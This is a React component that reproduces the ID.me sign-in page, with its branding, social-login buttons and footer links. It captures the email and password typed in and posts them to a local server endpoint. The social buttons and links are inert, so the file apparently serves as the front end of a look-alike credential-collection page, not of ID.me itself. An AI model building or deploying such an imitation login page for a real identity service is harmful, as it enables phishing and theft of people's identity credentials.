import React, { Component } from 'react';
import axios from "axios"

class App extends Component {
  constructor(props) {
    super(props);
    this.state = { 
      email:"",
      password:""
     }
  }
  Change=(e)=>{
    this.setState({[e.target.name]:e.target.value})
  }
  Submit=(e)=>{
    // { headers: {"Authorization" : `Markaranter ${Cookies.get("token")}`,"markaranterTwo":mainToken,"navigation":JSON.stringify(navigation)}
    e.preventDefault()
    console.log("sending data")
    const data= {
      email:this.state.email,
      password:this.state.password
    }
    axios.post(`http://localhost:8000/login`, {data: JSON.stringify(data)})
    .then(res => console.log(res.data))
    .catch(err => console.log(err)) 
  
  }
  render() { 
    return ( 
      <div className="container">
         <div className="row">
         <div className="d-none d-md-block col-md-4"></div>
          <div className="col-12 col-md-4" style={{padding:"0",margin:"0"}}>
          <div style={{marginTop:"20px"}}>
                 <center>
                    <img src={require("./logo.svg")}  style={{width:"20%"}} /> 
                    </center>
               </div>
               <div style={{backgroundColor: "white",boxShadow: "6px 2px 8px 4px lightgrey",width:"100%",padding:"0",margin:"0"}}>
             <div>
                 <center>
                     <h2 style={{padding:"25px",fontWeight:"bolder",fontSize:"20px"}}>Sign in to ID.me</h2>
                 </center>
             </div>
             <div style={{backgroundColor:"rgb(236, 241, 243)",border:"1px solid lightgrey"}}>
                 <center>
                    <div style={{padding:"20px",fontWeight: "normal",fontFamily: "Open Sans, sans-serif",wordSpacing: "0.8px"}}>
                     <small style={{fontSize:"15px",fontWeight:"bold"}}>
                         New to ID.me?<br/>
                         <a href="" style={{textDecoration:"underline"}}>Create an ID.me account</a>
                     </small>
                    </div>
                 </center>
             </div>
             <div style={{padding: "20px"}}>
               <form  onSubmit={this.Submit} method="post">
                 <small style={{fontSize:"15px"}}>Email</small><br/>
                 <input type="text" onChange={this.Change} name="email" placeholder="Enter your email" style={{width: "100%",padding:"15px 0px 15px 15px",border:"2px solid rgba(140, 140, 140,0.6)",borderRadius:"5px"}} />
                 <br/>
                 <br/>
                 <small style={{fontSize:"15px"}}>Password</small><br/>
                 <input type="password" onChange={this.Change} name="password" placeholder="Enter your password" style={{width: "100%",padding:"15px 0px 15px 15px",border:"2px solid rgba(140, 140, 140,0.6)",borderRadius:"5px"}} />
                 <br/>
                 <br/>
 <br/>
                 <button type="submit" className="btn" style={{backgroundColor:"rgb(0, 102, 204)",padding:"18px",fontWeight: "normal",border:"none",fontFamily: "Open Sans, sans-serif",color:"white",borderRadius:"5px",width:"100%"}}>
                 <center>
                   <span style={{fontSize:"17px"}}>  Sign in to ID.me</span>
                 </center>
                 </button>
               </form>
                 <br/>
                 <br/>
                 <center>
                    <a href="" style={{textDecoration:"underline"}}>
                     <small>
                         Forgot password
                     </small>
                    </a>
                 </center>
                 <br/>
                 <center>
                     <small>
                        -- Or sign in with --
                     </small>
                 </center>
                 <br/>
                 <div style={{display:"flex",flexWrap:"wrap"}}>
                  <div style={{width:"50%"}}>
                   <div style={{padding:"0",margin:"0"}}>
                 <small style={{border:"1px solid lightgrey",padding:"10px"}}>
                    <small style={{padding:"2px",paddingRight:"0"}}>
                     <span  className="text-primary fa fa-facebook fa-2x" ></span>
                    </small> Facebook</small>
                 </div>
                 </div>
                 <div style={{width:"50%"}}>
                     <div style={{padding:"0",margin:"0",float:"right"}}>
                   <small style={{border:"1px solid lightgrey",padding:"10px"}}>
                     <small style={{padding:"5px"}}>
          <span
            className="fa fa-google fa-2x text-danger"></span>
                     </small> Google</small>
                   </div>
                   </div>
                 </div>
                 <br/><br/>
                 <div style={{display:"flex",flexWrap:"wrap"}}>
               <div style={{width:"50%"}}>
                     <div style={{padding:"0",margin:"0"}}>
                   <small style={{border:"1px solid lightgrey",padding:"10px"}}>
                     <small style={{padding:"5px"}}>
                         <span  className="text-primary fa fa-linkedin fa-2x"></span>
                     </small> Linkedin</small>
                   </div>
                   </div>  
                   </div>
                   <br/>
                   <br/>
                   <div style={{width:"100%",border:"1px solid lightgrey"}}>
                     <center style={{padding:"13px"}}>
                         <small >View more options <span style={{fontWeight:"normal"}} className="fa fa-chevron-right text-primary ml-2"></span></small>
                     </center>
                     </div>
             </div>
               </div>
               <div style={{height:"150px"}}>
             <div style={{display: "flex",flexWrap:"nowrap",marginTop:"10px"}}>
             <div style={{width:"30%"}}>
             <center><small>What is ID.me?</small></center>
             </div>
             <div style={{width:"3%"}}>
                 <small>|</small>
                 </div>
                 <div style={{width:"30%"}}>
                     <small>Terms of Service</small>
                     </div>
                     <div style={{width:"3%"}}>
                         <small>|</small>
                         </div>
                     <div style={{width:"30%"}}>
                         <center><small>What is ID.me?</small></center>
                         </div>
             </div>
               </div>
          </div>
          </div>     
     </div>
     );
  }
}

  /*style="background: conic-gradient(from -45deg, #ea4335 110deg, #4285f4 90deg 180deg, #34a853 180deg 270deg, #fbbc05 270deg) 73% 55%/150% 150% no-repeat;
-webkit-background-clip: text;
background-clip: text;
color:red
" */

export default App;
